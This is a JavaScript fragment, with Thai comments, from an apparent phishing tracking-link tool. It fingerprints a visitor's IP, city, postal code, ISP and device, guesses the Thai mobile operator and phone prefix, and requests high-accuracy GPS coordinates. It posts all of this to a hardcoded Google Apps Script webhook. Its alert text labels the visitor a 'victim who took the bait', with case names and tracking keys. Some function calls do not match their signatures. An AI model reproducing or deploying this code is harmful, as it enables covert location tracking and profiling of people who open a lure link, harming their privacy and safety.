        keywords: ["dtac", "total access communication", "dtn", "dtac trinet", "telenor"],
        types: ["โทรศัพท์มือถือ"],
        mvno: ["fin mobile", "finnmobile"]
      },
      "TRUE": {
        keywords: ["true", "true move", "truemove", "true corporation", "trueonline", "real future", "trueh", "true visions"],
        types: ["โทรศัพท์มือถือ", "อินเทอร์เน็ตบ้าน", "ทีวี"],
        mvno: []
      },
      "NT": {
        keywords: ["cat", "tot", "national telecom", "nt", "cat telecom", "tot public company limited"],
        types: ["โทรศัพท์มือถือ", "อินเทอร์เน็ตบ้าน"],
        mvno: ["penguin", "pengiun sim"]
      },
      "3BB": {
        keywords: ["triple t broadband", "3bb", "triple t internet", "3bb broadband"],
        types: ["อินเทอร์เน็ตบ้าน", "ทีวี"],
        mvno: []
      },
      "JAS/MONO": {
        keywords: ["jas", "jasmine", "mono", "3bb mobile", "mono mobile"],
        types: ["อินเทอร์เน็ตบ้าน", "โทรศัพท์มือถือ"],
        mvno: []
      }
    };

    // MVNO ที่ต้องตรวจสอบแยก
    const mvnoOperators = {
      "GOMO": {
        parent: "AIS",
        keywords: ["gomo", "gomo mobile"]
      },
      "FIN Mobile": {
        parent: "DTAC",
        keywords: ["fin mobile", "finnmobile"]
      },
      "TrueMove H": {
        parent: "TRUE",
        keywords: ["truemove h", "truemoveh"]
      },
      "Penguin": {
        parent: "NT",
        keywords: ["penguin", "penguin sim"]
      },
      "MONO": {
        parent: "JAS/MONO",
        keywords: ["mono mobile"]
      }
    };

    // ค้นหาผู้ให้บริการจากชื่อ ISP ก่อน
    let foundOperator = false;
    let operatorDetails = {};
    
    // ตรวจสอบ MVNO ก่อน
    for (const [mvnoName, mvnoData] of Object.entries(mvnoOperators)) {
      if (mvnoData.keywords.some(keyword => networkInfo.includes(keyword))) {
        phoneInfo.possibleOperator = mvnoName;
        phoneInfo.operatorDetails = {
          type: "MVNO",
          parent: mvnoData.parent,
          name: mvnoName
        };
        foundOperator = true;
        break;
      }
    }

    // ถ้าไม่พบ MVNO ให้ตรวจสอบผู้ให้บริการหลัก
    if (!foundOperator) {
      for (const [operator, data] of Object.entries(thaiOperators)) {
        if (data.keywords.some(keyword => networkInfo.includes(keyword))) {
          phoneInfo.possibleOperator = operator;
          phoneInfo.operatorDetails = {
            type: "MNO",
            name: operator,
            services: data.types
          };
          foundOperator = true;
          break;
        }
      }
    }

    // ตรวจสอบ Network Information API เพิ่มเติม
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
      if (connection.type === 'cellular') {
        phoneInfo.networkType = connection.effectiveType || "Mobile";
        if (connection.effectiveType === '4g') {
          phoneInfo.networkType = "4G/LTE";
        } else if (connection.effectiveType === '5g') {
          phoneInfo.networkType = "5G";
        }
        
        if (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้") {
          phoneInfo.remarks = "เชื่อมต่อผ่านเครือข่ายมือถือ " + phoneInfo.possibleOperator + 
                             " (" + phoneInfo.networkType + ")";
        } else {
          phoneInfo.remarks = "เชื่อมต่อผ่านเครือข่ายมือถือ (" + phoneInfo.networkType + ")";
        }
      } else if (connection.type === 'wifi') {
        phoneInfo.networkType = "WiFi";
        
        if (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" && 
            phoneInfo.operatorDetails && 
            phoneInfo.operatorDetails.services && 
            phoneInfo.operatorDetails.services.includes("อินเทอร์เน็ตบ้าน")) {
          phoneInfo.remarks = "เชื่อมต่อผ่าน WiFi (อาจเป็นอินเทอร์เน็ตบ้านของ " + phoneInfo.possibleOperator + ")";
        } else {
          phoneInfo.remarks = "เชื่อมต่อผ่าน WiFi";
        }
      }
    }

    // ถ้ามีการเชื่อมต่อ WiFi แต่ ISP เป็นผู้ให้บริการมือถือ ให้อัปเดตหมายเหตุ
    if (phoneInfo.networkType === "WiFi" && 
        phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" && 
        ["AIS", "DTAC", "TRUE", "NT"].includes(phoneInfo.possibleOperator)) {
      phoneInfo.remarks = "เชื่อมต่อผ่าน WiFi (เครือข่ายมือถือ " + phoneInfo.possibleOperator + 
                         " อาจเป็น WiFi จากมือถือหรือ Home Internet)";
    }

    // กรณีประเทศไทย - เพิ่มข้อมูลเบอร์โทร
    if (isThailand && phoneInfo.possibleOperator !== "ไม่สามารถระบุได้") {
      const prefixByOperator = {
        "AIS": ["08", "06"],
        "DTAC": ["09", "06"],
        "TRUE": ["08", "06", "09"],
        "NT": ["08", "09"]
      };
      
      const mainOperator = phoneInfo.operatorDetails.type === "MVNO" ? 
                          phoneInfo.operatorDetails.parent : 
                          phoneInfo.possibleOperator;
      
      if (prefixByOperator[mainOperator]) {
        phoneInfo.remarks += "\nเบอร์โทรศัพท์น่าจะขึ้นต้นด้วย: " + prefixByOperator[mainOperator].join(" หรือ ");
      }
    }
    
    // ถ้าไม่ใช่ประเทศไทย แสดงข้อมูลประเทศและเครือข่าย
    if (!isThailand && ipDetails.country) {
      phoneInfo.remarks = "ประเทศ: " + ipDetails.country + 
                         (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" ? 
                         ", เครือข่าย: " + phoneInfo.possibleOperator : "");
    }

    return phoneInfo;

  } catch (error) {
    console.error("ไม่สามารถประมาณการเบอร์โทรศัพท์ได้:", error);
    return {
      mobileOperator: "ไม่สามารถระบุได้",
      possibleOperator: "ไม่สามารถระบุได้",
      countryCode: "ไม่สามารถระบุได้",
      remarks: "เกิดข้อผิดพลาดในการตรวจสอบข้อมูลเครือข่าย"
    };
  }
}

// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
async function getIPDetails() {
  try {
    // ใช้ ipinfo.io ซึ่งรวม IP และรายละเอียดในครั้งเดียว (ฟรี ไม่ต้องใช้ API key, มี rate limit)
    const response = await fetch('https://ipinfo.io/json');
    if (!response.ok) {
      throw new Error(`ipinfo.io request failed with status ${response.status}`);
    }
    const ipDetails = await response.json();

    // จัดรูปแบบข้อมูลให้สอดคล้องกับโครงสร้างเดิม + เพิ่มเติม
    return {
      ip: ipDetails.ip || "ไม่สามารถระบุได้",
      hostname: ipDetails.hostname || "ไม่มีข้อมูล", // เพิ่ม hostname
      city: ipDetails.city || "ไม่ทราบ",
      region: ipDetails.region || "ไม่ทราบ",
      country: ipDetails.country || "ไม่ทราบ", // ipinfo ใช้ 'country' code (e.g., TH)
      loc: ipDetails.loc || "ไม่มีข้อมูล", // พิกัด lat,long จาก IP
      org: ipDetails.org || "ไม่ทราบ", // องค์กร/ISP (ASN + Name)
      postal: ipDetails.postal || "ไม่มีข้อมูล", // รหัสไปรษณีย์
      timezone: ipDetails.timezone || "ไม่ทราบ",
      // แยก ASN และ ISP/Org name ถ้าเป็นไปได้
      asn: ipDetails.org ? ipDetails.org.split(' ')[0] : "ไม่ทราบ",
      isp: ipDetails.org ? ipDetails.org.substring(ipDetails.org.indexOf(' ') + 1) : "ไม่ทราบ"
    };
  } catch (error) {
    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
    // ลองใช้ fallback (ipify) หาก ipinfo ล้มเหลว
    try {
      const basicResponse = await fetch('https://api.ipify.org?format=json');
      const basicData = await basicResponse.json();
      return { ip: basicData.ip || "ไม่สามารถระบุได้" }; // คืนค่า IP พื้นฐาน
    } catch (fallbackError) {
      console.error("ไม่สามารถดึง IP จาก fallback (ipify) ได้:", fallbackError);
      return { ip: "ไม่สามารถระบุได้" };
    }
  }
}

// ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์ (มีข้อจำกัด)
async function estimatePhoneNumber() {
  const phoneInfo = {
    mobileOperator: "ไม่สามารถระบุได้",
    possibleOperator: "ไม่สามารถระบุได้",
    countryCode: "ไม่สามารถระบุได้",
    remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรงเนื่องจากข้อจำกัดความเป็นส่วนตัวของเบราว์เซอร์"
  };

  try {
    // ตรวจสอบผู้ให้บริการโทรศัพท์จากข้อมูล IP
    const ipDetails = await getIPDetails();

    // ตรวจสอบข้อมูลผู้ให้บริการจาก isp ที่ได้จาก ipapi.co
    const ispInfo = ipDetails.isp || "";

    // ตรวจสอบผู้ให้บริการในประเทศไทย
    const thaiOperators = {
      "AIS": ["AIS", "Advanced Info Service", "AWN", "ADVANCED WIRELESS NETWORK"],
      "DTAC": ["DTAC", "Total Access Communication", "DTN", "DTAC TriNet"],
      "TRUE": ["TRUE", "True Move", "TrueMove", "True Corporation", "TrueOnline", "Real Future"],
      "NT": ["CAT", "TOT", "National Telecom", "NT", "CAT Telecom", "TOT Public Company Limited"],
      "3BB": ["Triple T Broadband", "3BB", "Triple T Internet"]
    };

    // ค้นหาผู้ให้บริการจากชื่อ ISP
    for (const [operator, keywords] of Object.entries(thaiOperators)) {
      if (keywords.some(keyword => ispInfo.includes(keyword))) {
        phoneInfo.possibleOperator = operator;
        break;
      }
    }

    // ตรวจสอบข้อมูลเพิ่มเติมจาก User Agent
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Android")) {
      // บนแอนดรอยด์อาจมีชื่อเครือข่ายซ่อนอยู่ใน User-Agent บางรุ่น (แต่ปัจจุบันไม่ค่อยมีแล้ว)
      for (const [operator, keywords] of Object.entries(thaiOperators)) {
        if (keywords.some(keyword => userAgent.includes(keyword))) {
          phoneInfo.mobileOperator = operator;
          break;
        }
      }
    }

    // ดึงข้อมูลประเทศจาก IP
    if (ipDetails.country) {
      phoneInfo.countryCode = ipDetails.country;

      // ถ้าเป็นประเทศไทยให้ระบุรหัสประเทศ
      if (ipDetails.country === "Thailand" || ipDetails.country === "TH") {
        phoneInfo.countryCode = "+66";
      }
    }

    // ตรวจสอบ Network Information API เพิ่มเติม
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection && connection.type === 'cellular') {
      phoneInfo.remarks = "เชื่อมต่อผ่านเครือข่ายมือถือ " + (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" ? phoneInfo.possibleOperator : "");
    }

    return phoneInfo;

  } catch (error) {
    console.error("ไม่สามารถประมาณการเบอร์โทรศัพท์ได้:", error);
    return phoneInfo;
  }
}

// ฟังก์ชันพยายามดึงข้อมูลตำแหน่ง
function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(position) {
        // เมื่อได้รับพิกัด
        const lat = position.coords.latitude;
        const long = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const locationData = {
          lat: lat,
          long: long,
          accuracy: accuracy,
          gmapLink: `https://www.google.com/maps?q=${lat},${long}`
        };

        // ส่งข้อมูลอีกครั้งพร้อมพิกัด
        sendToLineNotify(ipData, locationData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName);
      },
      function(error) {
        console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
        // ไม่ต้องส่งข้อมูลอีกครั้ง เพราะส่งไปแล้วในครั้งแรก
      },
      {
        timeout: 5000,
        enableHighAccuracy: true
      }
    );
  }
}

// ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด
function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName) {
  // ข้อความหลัก
  const message = [
    "🎣แจ้งเตือนเหยื่อกินเบ็ด\n",
    `⏰เวลา: ${timestamp}`,
  ];
  // เพิ่มข้อมูล Case Name (ถ้ามี)
  if (caseName && caseName !== "ไม่มีค่า") {
    message.push(`📂ชื่อเคส: ${caseName}`);
  }
  // เพิ่มข้อมูล Tracking Key (ถ้ามี)
  if (trackingKey && trackingKey !== "ไม่มีค่า") {
    message.push(`🔑Tracking Key: ${trackingKey}`);
  }
  // --- ข้อมูล IP ละเอียด ---
  message.push(`🌐IP: ${ipData.ip || "ไม่มีข้อมูล"}`);
  if (ipData.hostname && ipData.hostname !== "ไม่มีข้อมูล") {
    message.push(`   - Hostname: ${ipData.hostname}`);
  }
  if (ipData.city && ipData.country) {
    // ใช้ country code ที่ได้จาก ipinfo (e.g., TH)
    message.push(`📍ตำแหน่ง (IP): ${ipData.city}, ${ipData.region}, ${ipData.country}`);
  }
  if (ipData.loc && ipData.loc !== "ไม่มีข้อมูล") {
    message.push(`   - พิกัด (IP): ${ipData.loc}`);
  }
  if (ipData.postal && ipData.postal !== "ไม่มีข้อมูล") {
    message.push(`   - รหัสไปรษณีย์: ${ipData.postal}`);
  }
  if (ipData.org && ipData.org !== "ไม่ทราบ") {
    message.push(`🏢องค์กร/ISP: ${ipData.org}`); // แสดงข้อมูล org เต็มๆ
  } else if (ipData.isp && ipData.isp !== "ไม่ทราบ") {
    message.push(`🔌เครือข่าย: ${ipData.isp}`); // Fallback ถ้าไม่มี org
  }
  if (ipData.timezone && ipData.timezone !== "ไม่ทราบ") {
    message.push(`   - Timezone: ${ipData.timezone}`);
  }
  // --- จบข้อมูล IP ---

  // ข้อมูลพิกัด GPS (ถ้ามี)
  if (location && location !== "ไม่มีข้อมูล" && location.lat && location.long) {
    message.push(`📍พิกัด GPS: ${location.lat}, ${location.long} (แม่นยำ ±${Math.round(location.accuracy)}m)`);
    message.push(`🗺️ลิงก์แผนที่: ${location.gmapLink}`);
  } else {
    message.push(`📍พิกัด GPS: ไม่สามารถระบุได้ (ผู้ใช้ไม่อนุญาต)`);
  }

  // ข้อมูลอุปกรณ์
  message.push(`📱อุปกรณ์: ${deviceData.deviceType} - ${deviceData.deviceModel}`);
  message.push(`🌐เบราว์เซอร์: ${deviceData.browser}`);

  // ข้อมูลหน้าจอ
  message.push(`📊ขนาดหน้าจอ: ${deviceData.screenSize} (${deviceData.screenColorDepth}bit, x${deviceData.devicePixelRatio})`);

  // ข้อมูลระบบ
  message.push(`🖥️ระบบปฏิบัติการ: ${deviceData.platform}`);
  message.push(`🔤ภาษา: ${deviceData.language}`);

  // ข้อมูลการเชื่อมต่อ (เพิ่มเติม)
  if (typeof deviceData.connection === 'object') {
    // แสดงประเภทการเชื่อมต่อ (WiFi หรือ Mobile)
    const networkTypeIcon = deviceData.connection.isWifi ? "📶" : "📱";
    const networkType = deviceData.connection.networkType;
    message.push(`${networkTypeIcon}การเชื่อมต่อ: ${networkType} (${deviceData.connection.effectiveType})`);
    message.push(`⚡ความเร็วโดยประมาณ: ${deviceData.connection.downlink} Mbps (RTT: ${deviceData.connection.rtt}ms)`);

    // ถ้าเป็น Mobile ให้แสดงข้อมูลเพิ่มเติม
    if (deviceData.connection.isMobile && phoneInfo) {
      message.push(`📞เครือข่ายมือถือ: ${phoneInfo.possibleOperator}`);
      if (phoneInfo.countryCode !== "ไม่สามารถระบุได้") {
        message.push(`🏴รหัสประเทศ: ${phoneInfo.countryCode}`);
      }
      message.push(`📝หมายเหตุ: ${phoneInfo.remarks}`);
    }
  }

  // ข้อมูลแบตเตอรี่
  if (typeof deviceData.battery === 'object') {
    message.push(`🔋แบตเตอรี่: ${deviceData.battery.level} (${deviceData.battery.charging})`);
  }

  return message.join("\n");
}

// ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
function sendToLineNotify(dataToSend) {
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbydls9VdR40-hUr_2uCGz7WXubw94sXLWVjUnd9Orh5vOAuarKfwSYvYI_ZpXKMvK13gg/exec';

  // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
  if (!dataToSend.requestId) {
    dataToSend.requestId = generateUniqueId();
  }
  
  // ใช้ sessionStorage เพื่อป้องกันการส่งซ้ำในวินโดว์เดียวกัน
  const sentRequests = JSON.parse(sessionStorage.getItem('sentRequests') || '[]');
  if (sentRequests.includes(dataToSend.requestId)) {
    console.log("ข้อมูลนี้เคยส่งแล้ว (requestId: " + dataToSend.requestId + ")");
    return;
  }
  
  console.log("กำลังส่งข้อมูลไป webhook (requestId: " + dataToSend.requestId + ")");

  // ส่งข้อมูล
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(dataToSend),
    mode: 'no-cors'
  })
  .then(() => {
    console.log("ส่งข้อมูลไปยัง Server สำเร็จ");
    
    // บันทึก requestId ที่ส่งสำเร็จแล้ว
    sentRequests.push(dataToSend.requestId);
    sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
  })
  .catch(error => {
    console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
  });
}

// สร้าง unique ID สำหรับแต่ละการร้องขอ
function generateUniqueId() {
  return Date.now().toString(36) + Math.random().toString(36).substring(2, 10);
}
